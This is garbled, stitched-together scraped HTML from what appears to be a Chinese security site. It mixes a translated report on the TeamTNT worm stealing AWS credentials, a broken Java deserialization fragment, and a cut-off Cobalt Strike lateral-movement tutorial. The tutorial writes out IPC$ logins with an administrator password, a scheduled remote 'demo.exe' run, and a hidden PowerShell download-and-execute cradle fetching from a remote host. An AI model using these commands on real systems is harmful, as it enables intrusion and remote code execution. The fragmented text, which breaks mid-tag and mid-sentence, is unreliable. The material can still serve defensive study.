SimSun;\">1.通过thinkphp5.0*代码执行漏洞包含日志文件拿shell。</span></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 15:08:45","updatedTime":"2020-09-05 15:08:45","title":"TEAM TNT：窃取AWS凭证的加密货币挖矿蠕虫","link":"https://www.secpulse.com/?p=140346","description":"<p>研究人员近期发现一个可以窃取AWS凭证的加密货币蠕虫。这是首个含有AWS特定功能的蠕虫，该蠕虫可以窃取本地凭证、扫描错误配置的Docker平台的网络。研究人员发现黑客组织Team***已经成功入侵了大量的Docker和Kubernetes 系统。</p>\n<p>随着越来越多的企业和组织将计算资源迁移到云和容器环境中，未来此类攻击将越来越多。</p>\n<p style=\"text-align: center\"><a href=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image20.png\"><img class=\"aligncenter size-large\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image20-1024x419.png\" title=\"image20-1024x419.png\" alt=\"image.png\"/></a></p>\n<p style=\"text-align: center\">图 1: Team***蠕虫首次运行时在屏幕上打印的消息</p>\n<h3>AWS凭证窃取</h3>\n<p>AWS CLI将凭证保存以未加密文件的形式保存在~/.aws/credentials，其他的配置信息保存在名为~/.aws/config 的文件中。</p>\n<p>窃取AWS凭证的代码非常直接，执行后会上传默认的AWS &#160;.credentials（凭证）和 .config（配置）文件到攻击者的服务器——sayhi.bplace[.]net:</p>\n<p style=\"text-align: center\"><a href=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image21.png\"><img class=\"aligncenter size-large\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image21-1024x368.png\" title=\"image21-1024x368.png\" alt=\"image.png\"/></a></p>\n<p style=\"text-align: center\">图 2: 从受害者系统中窃取AWS凭证的代码</p>\n<p>攻击者用Curl来发送AWS凭证到Team*** 的服务器，服务器会响应消息“THX”：</p>\n<p style=\"text-align: center\"><a href=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image22.png\"><img class=\"aligncenter size-large\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image22.png\" title=\"image22.png\" alt=\"image.png\"/></a></p>\n<p style=\"text-align: center\">图 3: 窃取的AWS凭证生成的网络流量</p>\n<p>研究人员发送CanaryTokens.org创建的凭证到Team*** 服务器，但没有使用过。这表明Team*** 手动评估或使用该凭证，或之前创建的自动化工具无法正常工作。</p>\n<h3>传播</h3>\n<p>大多数的加密货币挖矿蠕虫都是直接复制和粘贴其他蠕虫的代码并进行修改。Team*** 的蠕虫中也含有来自Kinsing 蠕虫的代码，目的是停止阿里云安全工具：</p>\n<p style=\"text-align: center\"><a href=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image23.png\"><img class=\"aligncenter size-large\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image23.png\" title=\"image23.png\" alt=\"image.png\"/></a></p>\n<p style=\"text-align: center\">图 4: 阻止阿里云安全工具运行的代码</p>\n<p>未来，将可能会有更多的蠕虫会复制窃取AWS 凭证文件的能力。</p>\n<h3>Docker</h3>\n<p>蠕虫中还含有用masscan 扫描开放的Docker API的代码，然后在新容器中安装自己：</p>\n<p style=\"text-align: center\"><a href=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image24.png\"><img class=\"aligncenter size-large\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image24.png\" title=\"image24.png\" alt=\"image.png\"/></a></p>\n<p style=\"text-align: center\">图 5: 扫描开放的Docker API，然后安装蠕虫到新容器中</p>\n<h3>漏洞利用</h3>\n<p>该蠕虫部署了XMRig 加密货币挖矿工具来挖门罗币，以此为攻击者赚钱。其中一个矿池提供了蠕虫黑掉的系统的详细情况：</p>\n<p style=\"text-align: center\"><a href=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image25.png\"><img class=\"aligncenter size-large\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image25.png\" title=\"image25.png\" alt=\"image.png\"/></a></p>\n<p style=\"text-align: center\">图 6: Monero Ocean 矿池中门罗币钱包的数据</p>\n<p>该页面一共有119个被黑的系统，其中包括Kubernetes 集群和Jenkins Build 服务器。</p>\n<p>截止目前，研究人员共发现2个与该攻击相关的门罗币地址，共为Team*** 赚取了3门罗币，价值约300美元，但这只是其中一起攻击活动。</p>\n<p>该蠕虫还部署了大量的恶意软件：</p>\n<ul class=\" list-paddingleft-2\">\n<li>\n<p>punk.py – SSH 利用工具</p>\n</li>\n<li>\n<p>日志清除工具</p>\n</li>\n<li>\n<p>Diamorphine Rootkit</p>\n</li>\n<li>\n<p>Tsunami IRC 后门</p>\n</li>\n<li>\n<p>Team***</p>\n</li>\n</ul>\n<p>蠕虫中大量引用了Team***，并且使用的域名也是teamtnt[.]red。该域名上保存着恶意软件，主页Team*** RedTeamPentesting 是对公开恶意软件沙箱的引用：</p>\n<p style=\"text-align: center\"><a href=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image26.png\"><img class=\"aligncenter size-large\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2020/09/image26.png\" title=\"image26.png\" alt=\"image.png\"/></a></p>\n<p style=\"text-align: center\">图 7: teamtnt[.]red主页</p>\n<h3>结论</h3>\n<p>这些攻击其实并不复杂，有许多部署加密货币挖矿蠕虫的黑客组织已经成功感染了大量的商业系统。研究人员给出了如下建议：</p>\n<ul class=\" list-paddingleft-2\">\n<li>\n<p>了解哪些系统保存了AWS凭证文件，如果不需要那么就删除。事实上，许多生产系统中都意外保留了开发阶段的凭证。</p>\n</li>\n<li>\n<p>使用防火墙规则来限制对Docker API的访问。研究人员强烈建议在设置防火墙时使用白名单方法。</p>\n</li>\n<li>\n<p>检查所有到矿池的连接的网络流量，或使用Stratum挖矿工具。</p>\n</li>\n<li>\n<p>检查通过HTTP 发送AWS 凭证文件的所有连接。</p>\n</li>\n</ul>\n<p><br/></p>\n<p>本文翻译自：https://www.cadosecurity.com/2020/08/17/teamtnt-the-first-crypto-mining-worm-to-steal-aws-credentials/</p>\n<p><br/></p>\n","descriptionType":"text/html","publishedDate":"Thu, 0.9em\">ValueExtractor</code></span><span md-inline=\"plain\" style=\"box-sizing: border-box\">类实例，进入if分支，并调用this.m_comparator的extract方法，参数为</span><span md-inline=\"code\" spellcheck=\"false\" spellcheck=\"false\" style=\"box-sizing: border-box\"><code style=\"box-sizing: border-box;font-family: var(--monospace);vertical-align: initial;border: 1px solid rgb(231, 234, 237);background-color: class=\"md-end-block md-p\" style=\"box-sizing: border-box;line-height: inherit;orphans: 4;margin-top: 0.8em;margin-bottom: 0.8em;white-space: pre-wrap;position: relative;color: rgb(51, 51, 3px;padding: 0px 2px;font-size: 0.9em\">PriorityQueue</code></span><span md-inline=\"plain\" style=\"box-sizing: border-box\">一个基于优先级的无界优先级队列。</span></p>\n<p cid=\"n129\" mdtype=\"paragraph\" class=\"md-end-block md-p\" style=\"box-sizing: border-box;line-height: inherit;orphans: 4;margin-top: 0.8em;margin-bottom: 0.8em;white-space: pre-wrap;position: relative;color: rgb(51, 51, 51);font-family: &#39;Open Sans&#39;, &#39;Clear Sans&#39;, &#39;Helvetica Neue&#39;, Helvetica, Arial, sans-serif;font-size: 16px\"><span md-inline=\"plain\" style=\"box-sizing: border-box\">优先级队列的元素按照其自然顺序进行排序，放入</span><span md-inline=\"code\" spellcheck=\"false\" style=\"box-sizing: border-box\"><code style=\"box-sizing: border-box;font-family: var(--monospace);vertical-align: initial;border: 1px solid rgb(231, 234, 237);background-color: rgb(243, 244, 244);border-radius: 3px;padding: 0px 2px;font-size: 0.9em\">PriorityQueue</code></span><span md-inline=\"plain\" style=\"box-sizing: border-box\">的元素，必须实现</span><span md-inline=\"code\" spellcheck=\"false\" style=\"box-sizing: border-box\"><code style=\"box-sizing: border-box;font-family: var(--monospace);vertical-align: initial;border: 1px solid rgb(231, 234, 237);background-color: rgb(243, 244, 244);border-radius: 3px;padding: 0px 2px;font-size: 0.9em\">Comparable</code></span><span md-inline=\"plain\" style=\"box-sizing: border-box\">接口，</span><span md-inline=\"code\" spellcheck=\"false\" style=\"box-sizing: border-box\"><code style=\"box-sizing: border-box;font-family: var(--monospace);vertical-align: initial;border: 1px solid rgb(231, 234, 237);background-color: rgb(243, 244, 244);border-radius: 3px;padding: 0px 2px;font-size: 0.9em\">PriorityQueue</code></span><span md-inline=\"plain\" style=\"box-sizing: border-box\">会根据元素的排序顺序决定出队的优先级；或者根据构造队列时提供的</span><span md-inline=\"code\" spellcheck=\"false\" style=\"box-sizing: border-box\"><code style=\"box-sizing: border-box;font-family: var(--monospace);vertical-align: initial;border: 1px solid rgb(231, 234, 237);background-color: rgb(243, 244, 244);border-radius: 3px;padding: 0px 2px;font-size: 0.9em\">Comparator</code></span><span md-inline=\"plain\" style=\"box-sizing: border-box\">进行排序，元素就不必实现</span><span md-inline=\"code\" spellcheck=\"false\" style=\"box-sizing: border-box\"><code style=\"box-sizing: border-box;font-family: var(--monospace);vertical-align: initial;border: 1px solid rgb(231, 234, 237);background-color: rgb(243, 244, 244);border-radius: 3px;padding: 0px 2px;font-size: 0.9em\">Comparable</code></span><span md-inline=\"plain\" style=\"box-sizing: border-box\">接口，具体取决于所使用的构造方法。</span></p>\n<p cid=\"n130\" mdtype=\"paragraph\" class=\"md-end-block md-p\" style=\"box-sizing: border-box;line-height: inherit;orphans: 4;margin-top: 0.8em;margin-bottom: 0.8em;white-space: pre-wrap;position: mdtype=\"paragraph\" class=\"md-end-block md-p\" style=\"box-sizing: border-box;line-height: inherit;orphans: 4;margin-top: 0.8em;margin-bottom: 0.8em;white-space: pre-wrap;position: relative;color: style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">针对于内网渗透个人理解为信息收集（内部网段的扫描、端口服务、操作系统、补丁更新、域机器及重要业务机器定位、杀毒软件、防火墙策略、密码的规则、内部敏感文档等）然后根据获取到的信息来绘画出内部的网络结构和内网脆弱点从而进行横向渗透。</span></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">本篇文章记载了当拿到内网机器的密码或Hash进行横向移动的方式。</span></p>\n<hr style=\"box-sizing: content-box;height: 2px;margin-top: 16px;margin-bottom: 16px;border-width: 0px;border-style: border-box;\">01</section>\n<section style=\"margin-bottom: 0.25em;padding-right: 5px;padding-left: 5px;max-width: 100%;display: inline-block;vertical-align: bottom;border-bottom: 1px dashed rgb(175, 1em;\">环境介绍</section>\n</section>\n<section style=\"max-width: 100%;display: inline-block;vertical-align: bottom;width: 0.5em;height: 0.5em;border-radius: 50%;background-color: rgb(128, 177, 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;font-family: 宋体, SimSun;color: #1C7231;\"><strong style=\"box-sizing: border-box;\">1.1 扩展图</strong></span></p>\n<p style=\"text-align: center;\"><img class=\"rich_pages js_insertlocalimg\" style=\"width: 100%;height: auto;\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-140140-1599014485.png\"/></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;font-family: 宋体, SimSun;color: #1C7231;\"><strong style=\"box-sizing: border-box;\">1.2 网络环境</strong></span></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"font-size: 15px;color: #585858;font-family: 宋体, SimSun;\"><span md-inline=\"plain\" style=\"box-sizing: border-box;\">Windows 7 跳版机（192.168.200.222、10.211.66.5）双网卡可出网也可与内网连通。</span> <span md-inline=\"plain\" style=\"box-sizing: border-box;\">Windows server 2012 目标靶机（192.168.200.66）不可出网。</span></span></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;font-family: 宋体, SimSun;color: #1C7231;\"><strong style=\"box-sizing: border-box;\">1.3 简述</strong></span></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">攻击者通过渗透测试拿到主机Win 7(192.168.200.222)的权限并发现可出网，所以上线CS用来权限维持。</span></p>\n<p style=\"text-align: center;\"><img class=\"rich_pages js_insertlocalimg\" style=\"width: 100%;height: auto;\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-140140-1599014489.png\"/></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">前提我们已经抓取到Win 7(192.168.200.222)跳板机的登陆明文凭证，这里是我添加的明文凭证，窃取凭证的方法有很多这里不在赘述参考文章，此篇文章只记录个人在学习内网环境下横向移动的一些笔记。</span></p>\n<p style=\"text-align: center;\"><img class=\"rich_pages js_insertlocalimg\" style=\"width: 100%;height: auto;\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-140140-1599014491.png\"/></p>\n<p style=\"text-align: center;\"><img class=\"rich_pages js_insertlocalimg\" style=\"width: 100%;height: auto;\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-140140-1599014494.png\"/></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">添加一个 Win 7(192.168.200.222)跳板机的监听器用来做中转会话。</span></p>\n<p style=\"text-align: center;\"><img class=\"rich_pages js_insertlocalimg\" style=\"width: 100%;height: auto;\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-140140-1599014496.png\"/></p>\n<p style=\"text-align: center;\"><img class=\"rich_pages js_insertlocalimg\" style=\"width: 100%;height: auto;\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-140140-1599014500.png\"/></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">生成木马文件在本地。</span></p>\n<p style=\"text-align: center;\"><img class=\"rich_pages js_insertlocalimg\" style=\"width: 100%;height: auto;\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-140140-1599014503.png\"/></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\"><em style=\"box-sizing: border-box;\">Tips：因为Win 2012(192.168.200.66)目标机不出外网所以选择刚添加的中转会话。</em></span></p>\n<p cid=\"n37\" mdtype=\"paragraph\" style=\"box-sizing: border-box;line-height: inherit;orphans: 4;margin-top: 0.8em;margin-bottom: 0.8em;white-space: pre-wrap;font-size: 16px;font-family: Helvetica, Arial, sans-serif;\"><br/></p>\n<section>\n<section style=\"display: inline-block;margin: 10px auto;\">\n<section style=\"border-width: 0px;border-style: none;border-color: initial;display: flex;justify-content: flex-start;align-items: flex-end;box-sizing: border-box;\">\n<section style=\"width: 1.8em;text-align: center;height: 1.8em;line-height: 1.8em;font-size: 18px;background-color: rgb(128, 177, 53);color: rgb(255, 255, 255);border-radius: 100%;box-sizing: border-box;\">02</section>\n<section style=\"margin-bottom: 0.25em;padding-right: 5px;padding-left: 5px;max-width: 100%;display: inline-block;vertical-align: bottom;border-bottom: 1px dashed rgb(175, 175, 175);border-top-color: rgb(128, 177, 53);border-left-color: rgb(128, 177, 53);border-right-color: rgb(128, 177, 53);box-sizing: border-box;\">\n<section style=\"max-width: 100%;min-height: 1em;\">IPC$ &#38;&#38; 计划任务</section>\n</section>\n<section style=\"max-width: 100%;display: inline-block;vertical-align: bottom;width: 0.5em;height: 0.5em;border-radius: 50%;background-color: rgb(128, 177, 53);color: rgb(255, 255, 255);overflow: hidden;box-sizing: border-box;\"><br/></section>\n</section>\n</section>\n</section>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;font-family: 宋体, SimSun;color: #1C7231;\"><strong style=\"box-sizing: border-box;\">2.1 利用条件</strong></span></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"font-size: 15px;color: #585858;font-family: 宋体, SimSun;\"><span md-inline=\"plain\" style=\"box-sizing: border-box;\">1）没有禁用IPC$连接、139和445端口、未使用防火墙等方式来阻止IPC$。</span> </span></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"font-size: 15px;color: #585858;font-family: 宋体, SimSun;\"><span md-inline=\"plain\" style=\"box-sizing: border-box;\">2）目标机器开启了相关的IPC$服务。</span> </span></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"font-size: 15px;color: #585858;font-family: 宋体, SimSun;\"><span md-inline=\"plain\" style=\"box-sizing: border-box;\">3）需要目标机器的管理员账号和密码（IPC$空连接除外）。</span> </span></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"font-size: 15px;color: #585858;font-family: 宋体, SimSun;\"><span md-inline=\"plain\" style=\"box-sizing: border-box;\">4）需要得知目标机器IP地址并可互相通信。</span></span></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;font-family: 宋体, SimSun;color: #1C7231;\"><strong style=\"box-sizing: border-box;\">2.2 利用方式</strong></span></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">在CS客户端对Win 7(192.168.200.222)会话进行操作。</span></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">对 Win 2012(192.168.200.66)目标主机建立共享连接，并查看目标主机共享资源。</span></p>\n<section class=\"code-snippet__fix code-snippet__js\">\n<pre class=\"code-snippet__js\">beacon&#62;&#160;shell&#160;net&#160;use&#160;\\192.168.200.66&#160;/user:administrator&#160;&#34;Hacker@1.&#34;\nbeacon&#62;&#160;shell&#160;net&#160;view&#160;\\192.168.200.66</pre>\n</section>\n<p style=\"text-align: center;\"><img class=\"rich_pages js_insertlocalimg\" style=\"width: 100%;height: auto;\" class=\"code-snippet__js\">net&#160;time&#160;\\192.168.200.66\nat&#160;\\192.168.200.66&#160;11:05&#160;c:demo.exe</pre>\n</section>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">成功上线，该会话为被动连接，不操作的不会回连，如果中转机会话断掉，该会话也会断掉。</span></p>\n<p style=\"text-align: center;\"><img class=\"rich_pages js_insertlocalimg\" style=\"width: 100%;height: SimSun;color: #1C7231;\"><strong style=\"box-sizing: border-box;\">2.3 IPC 相关的命令</strong></span></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 共享。</span></p>\n<section class=\"code-snippet__fix code-snippet__js\">\n<pre class=\"code-snippet__js\">net&#160;share&#160;ipc$\nnet&#160;share&#160;ipc$&#160;/del</pre>\n</section>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">共享计算机 C 盘。</span></p>\n<section class=\"code-snippet__fix code-snippet__js\">\n<pre class=\"code-snippet__js\">net&#160;share&#160;C=c:</pre>\n</section>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">查看/删除共享的资源。</span></p>\n<section class=\"code-snippet__fix code-snippet__js\">\n<pre class=\"code-snippet__js\">net&#160;share\nnet&#160;share&#160;C&#160;/del</pre>\n</section>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">取消IPC远程连接。</span></p>\n<section class=\"code-snippet__fix code-snippet__js\">\n<pre class=\"code-snippet__js\">net&#160;use&#160;*&#160;/del&#160;/y</pre>\n</section>\n<hr style=\"box-sizing: content-box;height: 2px;margin-top: 16px;margin-bottom: 16px;border-width: 0px;border-style: none;border-color: initial;background-color: rgb(231, 231, 231);\"/>\n<p cid=\"n74\" mdtype=\"paragraph\" style=\"box-sizing: border-box;line-height: inherit;orphans: 4;margin-top: 0.8em;margin-bottom: 0.8em;white-space: pre-wrap;font-size: 16px;font-family: Helvetica, Arial, sans-serif;\"><br/></p>\n<section>\n<section style=\"display: inline-block;margin: 10px auto;\">\n<section style=\"border-width: 0px;border-style: none;border-color: initial;display: flex;justify-content: flex-start;align-items: flex-end;box-sizing: border-box;\">\n<section style=\"width: 1.8em;text-align: center;height: 1.8em;line-height: 1.8em;font-size: 18px;background-color: rgb(128, 177, 53);color: rgb(255, 255, 255);border-radius: 100%;box-sizing: border-box;\">03</section>\n<section style=\"margin-bottom: 0.25em;padding-right: 5px;padding-left: 5px;max-width: 100%;display: inline-block;vertical-align: bottom;border-bottom: 1px dashed rgb(175, 175, 175);border-top-color: rgb(128, 177, 53);border-left-color: rgb(128, 177, 53);border-right-color: rgb(128, 177, 53);box-sizing: border-box;\">\n<section style=\"max-width: 100%;min-height: 1em;\">WMI</section>\n</section>\n<section style=\"max-width: 100%;display: inline-block;vertical-align: bottom;width: 0.5em;height: 0.5em;border-radius: 50%;background-color: rgb(128, 177, 53);color: rgb(255, 255, 255);overflow: hidden;box-sizing: border-box;\"><br/></section>\n</section>\n</section>\n</section>\n<blockquote cid=\"n76\" mdtype=\"blockquote\" style=\"box-sizing: border-box;margin-top: 0.8em;margin-bottom: 0.8em;border-left-width: 4px;border-left-color: rgb(223, 226, 229);padding-top: 0px;padding-right: 15px;padding-left: 15px;color: rgb(119, 119, 119);font-size: 16px;font-family: Helvetica, Arial, sans-serif;\"><p style=\"box-sizing: border-box;orphans: 4;white-space: pre-wrap;margin-left: 5px;margin-right: 5px;line-height: 1.75em;letter-spacing: 2.5px;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">WMI(Windows Management Instrumentation，Windows管理规范)是一项核心的Windows管理技术；用户可以使用WMI管理本地和远程计算机。</span></p>\n</blockquote>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;font-family: 宋体, SimSun;color: #1C7231;\"><strong style=\"box-sizing: border-box;\">3.1 利用条件</strong></span></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"font-size: 15px;color: #585858;font-family: 宋体, SimSun;\"><span md-inline=\"plain\" style=\"box-sizing: border-box;\">1）启动WMI服务（默认开启）。</span> </span></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"font-size: 15px;color: #585858;font-family: 宋体, SimSun;\"><span md-inline=\"plain\" style=\"box-sizing: border-box;\">2）开放135端口。</span></span></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;font-family: 宋体, SimSun;color: #1C7231;\"><strong style=\"box-sizing: border-box;\">3.2 利用方式</strong></span></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">在 CS 客户端对Win 7(192.168.200.222)会话进行操作。</span></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">使用CS生成一个WEB交互式Payload（Scripted Web Delivery）来实现无文件落地上线。</span></p>\n<p style=\"text-align: center;\"><img class=\"rich_pages js_insertlocalimg\" style=\"width: 100%;height: auto;\" src=\"https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-140140-1599014516.png\"/></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">生成的 Payload。</span></p>\n<section class=\"code-snippet__fix code-snippet__js\">\n<pre class=\"code-snippet__js\">powershell.exe&#160;-nop&#160;-w&#160;hidden&#160;-c&#160;&#34;IEX&#160;((new-object&#160;net.webclient).downloadstring(&#39;http://39.100.x.x:7799/a&#39;))&#34;</pre>\n</section>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\">在CS 客户端执行 wmic 远程命令。</span></p>\n<p style=\"box-sizing: border-box;orphans: 4;margin: 0.8em 5px;white-space: pre-wrap;font-size: 16px;line-height: 1.75em;letter-spacing: 2.5px;font-family: Helvetica, Arial, sans-serif;\"><span style=\"box-sizing: border-box;font-size: 15px;color: #585858;font-family: 宋体, SimSun;\"><em style=\"box-sizing: border-box;\">Tips：因为目标主机不出网所以需要把 